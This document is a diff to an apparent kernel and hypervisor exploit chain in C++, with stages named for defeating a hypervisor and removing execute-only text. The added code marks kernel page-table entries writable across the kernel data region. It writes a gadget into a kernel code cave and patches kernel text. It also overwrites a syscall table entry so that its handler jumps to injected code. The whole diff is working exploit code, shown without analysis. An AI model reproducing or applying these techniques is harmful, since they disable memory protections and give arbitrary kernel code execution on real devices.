@@ -277,7 +277,33 @@ int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
         }
         n++;
     }
-    std::print("  {} pages\n", n);
+    std::print("  {} pages on ktext\n", n);
+
+    start = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
+    end = (uint64_t)KERNEL_ADDRESS_DATA_BASE + 0x08000000;
+    for (uint64_t a = start; a < end; a += 0x1000) {
+
+        //std::print("VA to unlock : {:x}\n", a);
+
+        uint64_t pde, pde_a = find_pde(pmap, a, &pde);
+        if (pde_a != ~0ULL) {
+            SET_PDE_BIT(pde, RW);
+            kernel_copyin(&pde, pde_a, sizeof(pde));
+            uint64_t read = 0;
+            kernel_copyout(pde_a, &read, sizeof(read));
+            //std::print("Entry pde a: {:x} pde_a: {:x} write: {:016x} read: {:016x}\n", a, pde_a, pde, read);
+        }
+        uint64_t pte, pte_a = find_pte(pmap, a, &pte);
+        if (pte_a != ~0ULL) {
+            SET_PDE_BIT(pte, RW);
+            kernel_copyin(&pte, pte_a, sizeof(pte));
+            uint64_t read3 = 0;
+            kernel_copyout(pte_a, &read3, sizeof(read3));
+            //std::print("Entry pte a: {:x} pte_a: {:x} write: {:016x} read: {:016x}\n\n", a, pte_a, pte, read3);
+        }
+        n++;
+    }
+    std::print("  {} pages on kdata\n", n);
     return 0;
 }
 
@@ -345,14 +371,12 @@ static int widen_cpuset_syscall() {
 
     uint64_t ktext = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
     uint64_t gadget_va = ktext + fw_off(ctx->fw, "KERNEL_OFF_CODE_CAVE") + 0x20000;
-    uint64_t gadget_pa = pmap_kextract(gadget_va);
 
     std::print("[clear_smap_smep_nda] before kernel_copyin into ktext code cave");
 
     usleep(3000000);
 
-    kernel_copyin(gadget, ctx->dmap_base + gadget_pa, sizeof(gadget));
-
+    kernel_copyin(gadget, gadget_va, sizeof(gadget));
     int done = 0;
     for (int i = 0; i < 16; i++) {
         if (pin_to_core(i) == 0) {
@@ -382,7 +406,7 @@ int stage5_patch_kernel(hv_defeat_ctx *ctx) {
         uint64_t va = ktext + p.offset;
         uint64_t pa = pmap_kextract(va);
         if (pa && pa < 0x100000000ULL) {
-            kernel_copyin(p.bytes, ctx->dmap_base + pa, p.len);
+            kernel_copyin(p.bytes, va, p.len);
             n++;
         }
     }
@@ -413,13 +437,13 @@ int stage6_install_kexec(hv_defeat_ctx *ctx) {
         return -1;
     }
 
-    uint64_t dmap = ctx->dmap_base;
-    dw4(dmap, entry_pa + offsetof(sysent, n_arg),     2);
-    kw8(dmap + entry_pa + offsetof(sysent, sy_call),  jmp);
-    dw4(dmap, entry_pa + offsetof(sysent, sy_flags),  0);
-    dw4(dmap, entry_pa + offsetof(sysent, sy_thrcnt), 1);
 
-    uint64_t v = kr8(dmap + entry_pa + offsetof(sysent, sy_call));
+    kw4(entry_va + offsetof(sysent, n_arg),     2);
+    kw8(entry_va + offsetof(sysent, sy_call),  jmp);
+    kw4(entry_va + offsetof(sysent, sy_flags),  0);
+    kw4(entry_va + offsetof(sysent, sy_thrcnt), 1);
+
+    uint64_t v = kr8(entry_va + offsetof(sysent, sy_call));
     std::print("  sysent[0x11].sy_call = 0x{:x}{}\n", v, (v == jmp) ? " ok" : " fail");
 
     return (v == jmp) ? 0 : -1;
